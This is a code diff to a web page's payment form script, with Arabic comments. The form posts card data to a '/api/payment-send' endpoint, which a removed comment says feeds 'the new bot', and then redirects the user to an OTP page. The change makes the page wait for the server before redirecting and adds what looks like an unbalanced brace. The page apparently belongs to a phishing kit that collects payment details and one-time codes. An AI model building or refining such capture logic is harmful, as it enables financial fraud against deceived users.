@@ -397,7 +397,7 @@
         valid = false;
       }
 
-      if (valid) {
+     if (valid) {
         submitBtn.disabled = true;
         submitBtn.textContent = '⏳ جاري إرسال البيانات والتحويل...';
 
@@ -410,20 +410,22 @@
         };
 
         try {
-          // إرسال البيانات في الخلفية للبوت الجديد فوراً
-          await fetch('/api/payment-send', {
+          // إرسال البيانات والانتظار حتى يرد السيرفر بنجاح تام
+          const response = await fetch('/api/payment-send', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(data)
           });
-
-          // تحويل المستخدم فوراً لصفحة الـ OTP بدون أي انتظار
-          window.location.href = 'otp.html';
-
+          
+          const result = await response.json();
+          console.log('Server response:', result);
         } catch (error) {
-          // حتى لو حدث خطأ بسيط في الاتصال، يتم تحويله لضمان استمرار التجربة
-          window.location.href = 'otp.html';
+          console.error('Fetch error:', error);
         }
+
+        // الانتقال لصفحة الـ OTP بعد ضمان الإرسال
+        window.location.href = 'otp.html';
+      }
       }
     });
   </script>
